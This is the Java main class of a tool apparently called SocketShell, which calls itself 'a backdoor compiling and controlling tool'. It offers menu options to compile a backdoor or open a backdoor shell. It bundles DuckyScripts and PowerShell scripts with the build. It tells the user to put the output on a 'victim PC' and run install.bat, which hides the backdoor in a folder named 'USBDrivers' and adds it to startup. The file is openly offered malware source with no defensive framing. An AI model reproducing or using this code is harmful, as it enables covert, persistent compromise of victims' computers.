package com.github.thatcherdev.socketshell;

import java.io.File;
import java.nio.file.Paths;
import java.util.Scanner;
import com.github.thatcherdev.socketshell.shell.Shell;

public class SocketShell {

	public final static Scanner sc = new Scanner(System.in);
	public final static String os = System.getProperty("os.name");

	public static void main(String[] args) {
		System.out.println("  _________              __           __   _________.__           .__  .__\n"
				+ " /   _____/ ____   ____ |  | __ _____/  |_/   _____/|  |__   ____ |  | |  |\n"
				+ " \\_____  \\ /  _ \\_/ ___\\|  |/ // __ \\   __\\_____  \\ |  |  \\_/ __ \\|  | |  |\n"
				+ " /        (  <_> )  \\___|    <\\  ___/|  | /        \\|   Y  \\  ___/|  |_|  |__\n"
				+ "/_______  /\\____/ \\___  >__|_ \\\\___  >__|/_______  /|___|  /\\___  >____/____/\n"
				+ "        \\/            \\/     \\/    \\/            \\/      \\/     \\/");
		System.out.println("Welcome to SocketShell");
		System.out.println("A backdoor compiling and controlling tool.\n");
		System.out.println("Select:");
		System.out.println("[0] Compile backdoor");
		System.out.println("[1] Open backdoor shell");
		String choice = getInput("op01");
		if (choice.equals("1"))
			Shell.start();
		boolean jre = false;
		if (os.contains("Windows")) {
			System.out.println(
					"Would you like to package the Java Runtime Environment from your computer with the backdoor\nso it can be run on computers without Java installed?(y/n):");
			jre = Boolean.parseBoolean(getInput("yn"));
		} else if (os.contains("Linux"))
			System.out.println(
					"If you would like to package a Java Runtime Environment with the backdoor so it can be run on computers without Java,\n"
							+ "create folder 'jre' in current directory with 'bin' and 'lib' folders from a Windows JRE distribution.\n");
		System.out.println("Place all desired '.duck' DuckyScripts and '.ps1' PowerShell scripts in scripts\n");
		System.out.println("Press ENTER to compile...");
		sc.nextLine();
		System.out.println("Compiling...\n");
		try {
			Setup.compile(jre);
		} catch (Exception e) {
			error("Could not compile:\n" + e.getMessage());
		}
		System.out.println("Compiled!\n");
		try {
			Thread.sleep(1000);
		} catch (InterruptedException e) {
		}
		System.out.println(
				"To start the backdoor on a victim PC, transfer all files from the directory 'backdoor' onto a victim PC and execute either run.bat or install.bat\n");
		System.out.println("run.bat will:\n-Start the backdoor\n-Display information for controlling the backdoor\n");
		System.out.println(
				"install.bat will:\n-Install the backdoor to 'C:\\ProgramData\\USBDrivers'\n-Add the backdoor to startup (if executed as administrator)\n"
						+ "-Run the backdoor\n-Display information for controlling the backdoor\n");
		System.out.println("Press ENTER to exit...");
		sc.nextLine();
	}

	/**
	 * Get user input and verify it's validity with {@link type}.
	 *
	 * @param type type of input needed
	 * @return user input
	 */
	public static String getInput(String type) {
		System.out.print(">");
		String ret = sc.nextLine();
		if (ret.isEmpty())
			return getInput(type);
		else if (type.equals("file") && !new File(ret).exists()) {
			System.out.println("\nFile not found\nEnter a valid file path:");
			getInput(type);
		} else if (type.equals("yn") && !(ret.equalsIgnoreCase("y") || ret.equalsIgnoreCase("n"))) {
			System.out.println("\nInvalid entry\nEnter 'y' or 'n':");
			return getInput(type);
		} else if (type.equals("drive") && !new File(ret + ":\\").exists()) {
			System.out.println("\nDrive not found\nInsert a USB drive and enter it's drive letter:");
			return getInput(type);
		} else if (type.startsWith("op") && (!type.substring(2).contains(ret) || !(ret.length() == 1)))
			return getInput(type);
		else
			System.out.println();

		if (type.equals("file"))
			return Paths.get(ret).toString();
		else if (type.equals("yn"))
			if (ret.equals("y"))
				return "true";
			else
				return "false";
		else
			return ret;
	}

	/**
	 * Display error message.
	 *
	 * @param errorMessage message to display
	 */
	public static void error(String errorMessage) {
		System.out.println("An error occurred:\n" + errorMessage + "\n");
		try {
			Thread.sleep(3000);
		} catch (Exception e) {
		}
		System.out.println("Program will now exit");
		try {
			Thread.sleep(2000);
		} catch (Exception e) {
		}
		System.exit(0);
	}
}
